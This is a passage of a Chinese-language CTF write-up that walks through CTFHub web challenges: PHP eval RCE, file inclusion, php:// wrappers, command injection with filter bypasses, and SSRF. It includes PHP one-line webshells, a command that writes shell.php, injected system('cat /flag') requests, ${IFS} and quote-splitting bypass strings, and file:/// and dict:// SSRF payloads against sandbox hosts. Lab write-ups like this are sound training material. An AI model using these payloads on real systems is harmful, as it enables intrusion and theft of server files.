class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试在URL中带上名为cmd的参数：（此处<code>system()</code>函数的作用为执行系统命令并输出执行结果）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;?cmd&#x3D;system(&quot;pwd&quot;);</span><br></pre></td></tr></table></figure><p>执行成功 此处需要注意参数结尾一定不能省略<code>;</code>，满足PHP语法才可以执行成功。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system("ls%20/");</span><br><span class="line">.../?cmd=system("cat%20/flag_xxxx");</span><br></pre></td></tr></table></figure><h4><span id="文件包含">文件包含</span></h4><ul><li>考察<code>include</code>函数</li></ul><p>访问shell页面，发现有一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">'ctfhub'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>假如在index.php中include了一个文件，那么不管这个文件后缀是什么  这个文件中的内容将会直接出现在index.php中，所以这道题的payload构造思路就是把shell.txt里的内容想办法放到index.php中去根据源码构造payload：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt</span><br></pre></td></tr></table></figure><p>直接使用蚁剑后缀加上payload即可</p><h4><span id="phpinput">php://input</span></h4><p><a href="https://blog.csdn.net/qq_51295677/article/details/123462929" target="_blank" rel="noopener">参考文献</a></p><p>常用到伪协议的<code>php://input</code>和<code>php://filter</code>.其中<code>php://input</code>要求<code>allow_url_include</code>设置为<code>On</code></p><ul><li>使用burp suite的repeater发送请求，构造请求报文</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-9144f5dff97c39a1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line"></span><br><span class="line">&lt;?php system("cat /flag_5734");?&gt;</span><br></pre></td></tr></table></figure><p>得到返回</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span>: Thu, 06 Apr 2023 08:05:02 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 113</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span>: X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span>: *</span><br><span class="line"></span><br><span class="line"><span class="attribute">ctfhub&#123;8c628d8ea62d6dc8316f15c3&#125;</span></span><br><span class="line"><span class="attribute">&lt;hr&gt;</span></span><br><span class="line">i don't have shell, how to get flag? &lt;br&gt;</span><br><span class="line">&lt;a href="phpinfo.php"&gt;phpinfo&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4><span id="读取源代码">读取源代码</span></h4><p><a href="https://blog.csdn.net/qq_61839115/article/details/128593214" target="_blank" rel="noopener">参考</a></p><ul><li>考点：<code>php://filter</code>可以作为一个中间流来处理其他流，具有四个参数。</li></ul><table><thead><tr><th>名称</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>指定了你要筛选过滤的数据流。</td><td>必选</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（</td><td>）分隔。</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（</td><td>）分隔。</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table><p>这道题就直接构造payload了</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/resource=/flag</span><br></pre></td></tr></table></figure><p>有些比赛赛题情况下还要用base64输出</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=<span class="built_in">convert</span>.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><p>使用burp suite</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=php://filter/resource=/flag</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-d9e9d5fbc32a97fe.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span>: Thu, 06 Apr 2023 08:34:10 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 106</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span>: X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span>: *</span><br><span class="line"></span><br><span class="line"><span class="attribute">ctfhub&#123;d797f76a6ac67e494a84fa86&#125;</span></span><br><span class="line"><span class="attribute">&lt;hr&gt;</span></span><br><span class="line">i don't have shell, how to get flag? &lt;br&gt;</span><br><span class="line">flag in &lt;code&gt;/flag&lt;/code&gt;</span><br></pre></td></tr></table></figure><h4><span id="远程包含">远程包含</span></h4><ul><li>解法1：和input那题解法一样</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-795660de70a9ad8e.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 28</span><br><span class="line"></span><br><span class="line">&lt;?php system("cat /flag");?&gt;</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span>: Thu, 06 Apr 2023 08:53:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 112</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span>: X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span>: *</span><br><span class="line"></span><br><span class="line"><span class="attribute">ctfhub&#123;db258363d74e58371cd85c86&#125;</span></span><br><span class="line"><span class="attribute">&lt;hr&gt;</span></span><br><span class="line">i don't have shell, how to get flag?&lt;br&gt;</span><br><span class="line">&lt;a href="phpinfo.php"&gt;phpinfo&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><p>解法2：</p><p>题目目的是想让我们自己搭个服务器，然后让靶机远程包含我们的代码，但是我并没有租赁VPS。</p></li></ul><p><a href="https://www.wolai.com/ctfhub/64arrieDUUPZTc1eFm6LLC" target="_blank" rel="noopener">参考答案</a></p><h4><span id="命令注入">命令注入</span></h4><p> 命令行注入漏洞是指web应用程序中调用了系统可执行命令的函数，而且输入参数是可控的，如果黑客拼接了注入命令，就可以进行非法操作了。</p><p><strong>Windows系统支持的管道符如下：</strong></p><ol><li>“|”：直接执行后面的语句。</li><li>“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><p><strong>Linux系统支持的管道符如下：</strong></p><ol><li>“;”：执行完前面的语句再执行后面的语句。</li><li>“|”：显示后面语句的执行结果。</li><li>“||”：当前面的语句执行出错时，执行后面的语句。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><ul><li><p>解法一：使用base64编码</p><ul><li><p>我们在框内输入</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls # 输出两个php文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls / #根目录没发现其他可疑文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php # 未回显</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php | base64 #使用base64编码</span><br><span class="line"># 解码后获得&lt;?php // ctfhub&#123;ed09b50ed879851ad5b5a4d9&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>解法二：重定向</p><ul><li>我们可以用重定向的方法注入一个一句话木马</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;<span class="built_in">echo</span> -e "&lt;?php @eval(\$_POST['test']);?&gt;" &gt; shell.php</span><br></pre></td></tr></table></figure><ul><li>使用蚁剑连接即可</li></ul></li></ul><h4><span id="过滤cat">过滤cat</span></h4><p>3.使用单引号绕过 </p><p>127.0.0.1; c’’at flag_2287214057241.php |base64<br>4.使用双引号绕过 </p><p>127.0.0.1; c””at flag_2287214057241.php |base64<br>5.利用Shell 特殊变量绕过</p><p>127.0.0.1; ca$@t flag_2287214057241.php|base64</p><h4><span id="过滤空格">过滤空格</span></h4><p>空格可以用以下字符代替：<br><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS</code>等</p><p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p><h4><span id="过滤目录分割符">过滤目录分割符</span></h4><p>思路上来说应该是cat文件，必须要使用目录分隔符/，但是题目给过滤。需要另外寻找办法  </p><ul><li>法一：使用cd绕开</li></ul><p>linux中：<code>%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</code></p><p>windows中：<code>%0a、&amp;、|</code></p><p>其中分号;的作用就是在 shell 中，担任”连续指令”功能</p><p>&amp;&amp;的方式：command1 &amp;&amp; command2 如果command1执行成功，则执行command2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd flag_is_here;cat flag_164641924722716.php|base64</span><br></pre></td></tr></table></figure><h4><span id="过滤运算符">过滤运算符</span></h4><ul><li>发现题目没有过滤<code>;</code>因此我们可以直接使用</li><li>在f12中的pre标签里面有注释</li></ul><h4><span id="综合练习">综合练习</span></h4><p><a href="https://blog.csdn.net/weixin_45897324/article/details/109271622" target="_blank" rel="noopener">url查看表</a></p><ul><li><p>题解一</p><p>%0a 代替 换行 ，<code>%09</code>代替 TAB键 （因为flag被过滤了，所以我们通过TAB来补全flag_is_here ）<code>%5c</code> 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了qwq）</p><p>这题得在地址栏输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0als</span><br><span class="line">?ip&#x3D;127.0.0.1%0als%09*is_here</span><br><span class="line">? # 查看flag_is_here文件夹下的文件ip&#x3D;127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_98358017212.php</span><br><span class="line"># 注：%0a代替换行，%09代替TAB键（因为flag被过滤了，所以我们通过TAB来补全flag_is_here）</span><br><span class="line">　　%5c代替\（用\来分隔开cat，因为cat也被过滤了qwq）</span><br></pre></td></tr></table></figure><p>在f12中能看到答案</p><figure class="highlight plain"><figcaption><span>source可以用ls sour\*，还可以使用ls \*rce</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 题解二</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;cmd</span><br><span class="line">  127.0.0.1%0als$&#123;IFS&#125;fl$*ag_is_here </span><br><span class="line">  127.0.0.1%0acd$&#123;IFS&#125;fl$ag_is_here%0aca&#39;&#39;t$&#123;IFS&#125;fl$a*g_230191972813921.php # 因为过滤了cat，我们这里使用单引号绕过过滤，如ca&#39;&#39;t 构造payload</span><br></pre></td></tr></table></figure><p>其中<code>&#39;&#39;</code>可以用<code>%27</code>代替，将cat的任意字母包裹。</p></li></ul><h3><span id="ssrf">SSRF</span></h3><blockquote><p>SSRT(Server-Side Request Forgery，服务器端请求伪造)，就是攻击者利用服务器能访问其他的服务器的功能，通过自己的构造服务器请求来攻击与外界不相连接的内网，我们知道内网与外网是不相通的，所以利用这一个特性，就可以利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。</p></blockquote><p><img src="a622392d2eac336271e32e052def5adc.png" alt="ssrf"></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/124697338" target="_blank" rel="noopener">reference</a></p><p><a href="https://blog.csdn.net/qq_57172130/article/details/126169480" target="_blank" rel="noopener">SSRF利用协议中的万金油——Gopher</a></p><ul><li>gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行</li><li>数据流末尾使用%0d%0a代表消息结束</li></ul><p><strong>关于url编码问题</strong></p><p>第一，利用ssrf经常要进行多次url编码（传参或者多次跳转需要多次url编码，也就是说，有多少次请求就要编码多少次，直接curl后接gopher://就编码一次，利用?url=gopher://这样的形式进行ssrf利用就相当于请求了两次，需要编码两次，如果有302跳转，则还需要再编码），第一次url编码后，将所有%0a改成%0¢%0a<br>gopher:/默认发送到70端口，一般我们需要发送到80端口，记得改</p><h4><span id="内网访问">内网访问</span></h4><ul><li><p>考察<code>http://</code>协议</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="伪协议读取文件">伪协议读取文件</span></h4><ul><li><p>这一题的考点主要是<strong>file协议</strong>读取文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="端口扫描">端口扫描</span></h4><ul><li>考察<code>dict://</code>协议</li></ul><p>使用burp suite进行端口扫描</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=dict://127.0.0.1:§§</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-235c64bde60462f1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>  然后注入使用数字从8000-9000，步进为1，发现端口<code>8243</code>的数据长度不一致。使用<code>http://</code>访问，<em>http可以忽略</em></p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://<span class="title">challenge</span>-235<span class="title">c64bde60462f1.sandbox.ctfhub.com</span>:10800/?<span class="title">url</span>=127.0.0.1:8243</span></span><br></pre></td></tr></table></figure><h4><span id="post请求">POST请求</span></h4><ul><li><p>使用dirsearch对服务器底下的目录进行扫描</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://challenge-c81b1dbf4106f429.sandbox.ctfhub.com:<span class="number">10800</span>/?url=<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>使用<code>file</code>协议对index.php页面<a href="https://so.csdn.net/so/search?q=源码&spm=1001.2101.3001.7020" target="_blank" rel="noopener">源码</a>进行读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_REQUEST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    header(<span class="string">"Location: /?url=_"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[<span class="string">'url'</span>]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure></li></ul><p>发送</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>返回</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REMOTE_ADDR"</span>] != <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Just View From 127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(<span class="string">"CTFHUB"</span>);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"key"</span>]) &amp;&amp; $_POST[<span class="string">"key"</span>] == $key) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"/flag.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $key;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><ul><li>题目意思是要构造一个POST请求，传参key</li></ul><p>访问<code>http://127.0.0.1/flag.php</code> 发现</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/flag.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"key"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=21327983b7a37abf3ace93cc0e64f15f--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 